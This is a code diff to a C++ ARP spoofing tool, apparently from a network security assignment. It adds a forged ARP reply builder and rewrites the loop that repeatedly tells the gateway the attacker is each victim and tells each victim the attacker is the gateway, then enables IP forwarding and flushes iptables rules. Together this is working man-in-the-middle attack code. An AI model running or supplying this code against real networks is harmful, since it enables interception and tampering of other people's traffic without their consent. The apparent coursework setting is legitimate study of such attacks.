@@ -55,7 +55,7 @@ string interface;
 string source_mac;
 int ifindex;
 
-struct ether_arp *fill_arp_packet(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip)
+struct ether_arp *fill_arp_request_packet(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip)
 {
     struct ether_arp *arp_packet;
     struct in_addr src_in_addr, dst_in_addr;
@@ -78,6 +78,30 @@ struct ether_arp *fill_arp_packet(const unsigned char *src_mac_addr, const char 
 
     return arp_packet;
 }
+
+struct ether_arp *fill_arp_reply_packet(const char *src_ip,const unsigned char *src_mac_addr,  const char *dst_ip, const unsigned char *dst_mac_addr){
+    struct ether_arp *arp_packet;
+    struct in_addr src_in_addr, dst_in_addr;
+    // ip address translation
+    inet_pton(AF_INET, src_ip, &src_in_addr);
+    inet_pton(AF_INET, dst_ip, &dst_in_addr);
+
+    // fill the arp packet
+    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
+    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
+    arp_packet->arp_pro = htons(ETHERTYPE_IP);
+    arp_packet->arp_hln = ETH_ALEN;
+    arp_packet->arp_pln = IP_ADDR_LEN;
+    arp_packet->arp_op = htons(ARPOP_REPLY);
+    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
+    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
+    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
+    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);
+
+    return arp_packet;
+}
+
+
 
 string exec(const char *cmd){
     array<char, 128> buffer;
@@ -189,7 +213,7 @@ void arp_request(const char *if_name, const char *base_ip)
         memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
         eth_header->ether_type = htons(ETHERTYPE_ARP);
         // arp packet
-        arp_packet = fill_arp_packet(src_mac_addr, src_ip, dst_ip.c_str());
+        arp_packet = fill_arp_request_packet(src_mac_addr, src_ip, dst_ip.c_str());
         memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
 
         // sendto
@@ -231,7 +255,7 @@ void list_devices()
         cout << it->first << "\t" << it->second << endl;
     }
 }
-void arp_reply(const char *if_name, const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip, const unsigned char *dst_mac_addr, const char *target_ip)
+void arp_reply(const char *if_name,const char *src_ip, const unsigned char *src_mac_addr, const char *dst_ip, const unsigned char *dst_mac_addr)
 {
     struct sockaddr_ll saddr_ll;
     struct ether_header *eth_header;
@@ -265,7 +289,7 @@ void arp_reply(const char *if_name, const unsigned char *src_mac_addr, const cha
     memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
     eth_header->ether_type = htons(ETHERTYPE_ARP);
     // arp packet
-    arp_packet = fill_arp_packet(src_mac_addr, src_ip, dst_ip);
+    arp_packet = fill_arp_reply_packet(src_ip, src_mac_addr, dst_ip, dst_mac_addr);
     memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
 
     // sendto
@@ -290,15 +314,15 @@ void keep_sending_arp_reply( unsigned char *source_mac_char, unsigned char *gate
                 sscanf(it->second.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                     &target_mac_char[0], &target_mac_char[1], &target_mac_char[2],
                     &target_mac_char[3], &target_mac_char[4], &target_mac_char[5]);
-                // send ARP reply to gateway 
-                // trick the gateway we are the victim
-                arp_reply(interface.c_str(), source_mac_char, source_ip.c_str(), gateway_ip.c_str(), target_mac_char, it->first.c_str());                
-                // send ARP reply to victim
-                // trick the victim we are the gateway
-                arp_reply(interface.c_str(), gateway_mac_char, gateway_ip.c_str(), it->first.c_str(), target_mac_char, source_ip.c_str());  
+                
+                // arpreply(interface, source_mac, source_ip, dst_ip, dst_mac)
+                // send ARP reply to gateway // trick the gateway we are the victim
+                arp_reply(interface.c_str(), it->first.c_str(), source_mac_char, gateway_ip.c_str(), gateway_mac_char);
+                // send ARP reply to victim  // trick the victim we are the gateway
+                arp_reply(interface.c_str(), gateway_ip.c_str(), source_mac_char, it->first.c_str(), target_mac_char);                
             }
         }
-        this_thread::sleep_for(chrono::microseconds(1000)); 
+        this_thread::sleep_for(chrono::microseconds(500)); 
     }
 
 
@@ -336,7 +360,7 @@ int main()
     system("sysctl -w net.ipv4.ip_forward=1 > /dev/null");
     system("iptables -F");
     system("iptables -F -t nat");
-    
+    // ...
 
     // task 1 : list all devices' IP/MAC addresses in the Wi-Fi network(except the attacker and gateway)
     list_devices();
